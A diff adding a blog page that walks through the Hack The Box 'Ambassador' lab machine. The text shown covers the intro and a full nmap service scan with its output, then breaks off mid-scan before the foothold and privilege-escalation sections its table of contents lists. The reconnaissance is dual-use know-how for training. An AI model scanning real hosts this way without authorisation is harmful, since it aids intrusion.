@@ -1,0 +1,1053 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Ambassador HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Ambassador HTB Walkthrough"><meta property="og:description" content="Intro This was my first medium difficulty box. I noticed it was the highest rated and due to be retired in 2 days &ndash; so I decided to tackle this machine in order to quickly release a walkthrough (content creation! clicks! views!) and practice my note taking skills. While I enjoy being in &rsquo;the zone&rsquo;, it is well worthwhile breaking momentarily to take comprehensive notes that can be weaved into a cohesive narrative &ndash; if only so I can retrace my steps and help with future CTF challenges."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-01-28-ambassador-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-28T00:00:00+11:00"><meta property="article:modified_time" content="2023-01-29T09:18:31+11:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Ambassador HTB Walkthrough"><meta name=twitter:description content="Intro This was my first medium difficulty box. I noticed it was the highest rated and due to be retired in 2 days &ndash; so I decided to tackle this machine in order to quickly release a walkthrough (content creation! clicks! views!) and practice my note taking skills. While I enjoy being in &rsquo;the zone&rsquo;, it is well worthwhile breaking momentarily to take comprehensive notes that can be weaved into a cohesive narrative &ndash; if only so I can retrace my steps and help with future CTF challenges."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-01-28-ambassador-htb/><link rel=prev href=https://emdwyer.github.io/2023-01-14-shoppy-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Ambassador HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-01-28-ambassador-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"pentesting, infosec, penetration testing, ctf, consul, grafana","wordcount":3583,"url":"https:\/\/emdwyer.github.io\/2023-01-28-ambassador-htb\/","datePublished":"2023-01-28T00:00:00+11:00","dateModified":"2023-01-29T09:18:31+11:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Ambassador HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-01-28>2023-01-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3583 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;17 minutes&nbsp;<span id=/2023-01-28-ambassador-htb/ class=leancloud_visitors data-flag-title="Ambassador HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./ambassador.png data-srcset="./ambassador.png, ./ambassador.png 1.5x, ./ambassador.png 2x" data-sizes=auto alt=./ambassador.png title=Ambassador></p><h2 id=intro>Intro</h2><p>This was my first medium difficulty box. I noticed it was the highest rated and due to be retired in 2 days &ndash; so I decided to tackle this machine in order to quickly release a walkthrough (content creation! clicks! views!) and practice my note taking skills. While I enjoy being in &rsquo;the zone&rsquo;, it is well worthwhile breaking momentarily to take comprehensive notes that can be weaved into a cohesive narrative &ndash; if only so I can retrace my steps and help with future CTF challenges.</p><p>I&rsquo;m guessing this may have been on the easier side of Medium difficulty, as I went from an nmap scan to root in a little under two hours. Enumeration, exploitation and privilege escalation were fairly straight forward &ndash; with privesc being a little less obvious in places.</p><h2 id=enumeration>Enumeration</h2><p>Initial nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.183
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-01-26 20:07 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.183
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.022s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Ambassador Development Server
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-generator: Hugo 0.94.2
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>3000/tcp open  ppp?
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>302</span> Found
+</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Expires: -1
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: /login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Pragma: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Set-Cookie: <span class=nv>redirect_to</span><span class=o>=</span>%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly<span class=p>;</span> <span class=nv>SameSite</span><span class=o>=</span>Lax
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Frame-Options: deny
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Xss-Protection: 1<span class=p>;</span> <span class=nv>mode</span><span class=o>=</span>block
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 09:07:55 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>29</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     Request
+</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>302</span> Found
+</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Expires: -1
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: /login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Pragma: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Set-Cookie: <span class=nv>redirect_to</span><span class=o>=</span>%2F<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly<span class=p>;</span> <span class=nv>SameSite</span><span class=o>=</span>Lax
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Frame-Options: deny
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Xss-Protection: 1<span class=p>;</span> <span class=nv>mode</span><span class=o>=</span>block
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 09:07:24 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>29</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>302</span> Found
+</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Expires: -1
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: /login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Pragma: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Set-Cookie: <span class=nv>redirect_to</span><span class=o>=</span>%2F<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly<span class=p>;</span> <span class=nv>SameSite</span><span class=o>=</span>Lax
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Frame-Options: deny
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Xss-Protection: 1<span class=p>;</span> <span class=nv>mode</span><span class=o>=</span>block
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 09:07:30 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl>3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
+</span></span><span class=line><span class=cl><span class=p>|</span>_sslv2: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> mysql-info: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   Protocol: <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Version: 8.0.30-0ubuntu0.20.04.2
+</span></span><span class=line><span class=cl><span class=p>|</span>   Thread ID: <span class=m>22</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Capabilities flags: <span class=m>65535</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Some Capabilities: Support41Auth, FoundRows, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, SupportsTransactions, LongPassword, Speaks41ProtocolOld, InteractiveClient, ConnectWithDatabase, SupportsCompression, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+</span></span><span class=line><span class=cl><span class=p>|</span>   Status: Autocommit
+</span></span><span class=line><span class=cl><span class=p>|</span>   Salt: edl<span class=se>\x</span>1CrF<span class=se>\K</span>Y<span class=se>\x</span>06<span class=p>&amp;</span>D?WD<span class=se>\x</span>12<span class=o>[</span>FEj
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Auth Plugin Name: caching_sha2_password
+</span></span><span class=line><span class=cl><span class=p>|</span>_tls-alpn: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-cert: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port3000-TCP:V<span class=o>=</span>7.92%I<span class=o>=</span>7%D<span class=o>=</span>1/26%Time<span class=o>=</span>63D242CD%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Ge
+</span></span><span class=line><span class=cl>SF:nericLines,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>GetRequest,174,<span class=s2>&#34;HTTP/1\.0\x20302\x20Found\r\nCache-Contro
+</span></span></span><span class=line><span class=cl><span class=s2>SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
+</span></span></span><span class=line><span class=cl><span class=s2>SF🇪🇸\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
+</span></span></span><span class=line><span class=cl><span class=s2>SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ion:\x201;\x20mode=block\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2009:07
+</span></span></span><span class=line><span class=cl><span class=s2>SF::24\x20GMT\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\&#34;/login\&#34;&gt;Found&lt;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:/a&gt;\.\n\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+</span></span></span><span class=line><span class=cl><span class=s2>SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,12E,<span class=s2>&#34;HTTP/1\.0\x20302\x20Found\r\nCac
+</span></span></span><span class=line><span class=cl><span class=s2>SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
+</span></span></span><span class=line><span class=cl><span class=s2>SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
+</span></span></span><span class=line><span class=cl><span class=s2>SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Th
+</span></span></span><span class=line><span class=cl><span class=s2>SF:u,\x2026\x20Jan\x202023\x2009:07:30\x20GMT\r\nContent-Length:\x200\r\n\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>SSLSessionReq,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Req
+</span></span></span><span class=line><span class=cl><span class=s2>SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0close\r\n\r\n400\x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>TerminalServerCookie,67,<span class=s2>&#34;HTTP/1
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+</span></span></span><span class=line><span class=cl><span class=s2>SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>TLSSess
+</span></span><span class=line><span class=cl>SF:ionReq,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+</span></span></span><span class=line><span class=cl><span class=s2>SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+</span></span></span><span class=line><span class=cl><span class=s2>SF:quest&#34;</span><span class=o>)</span>%r<span class=o>(</span>Kerberos,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
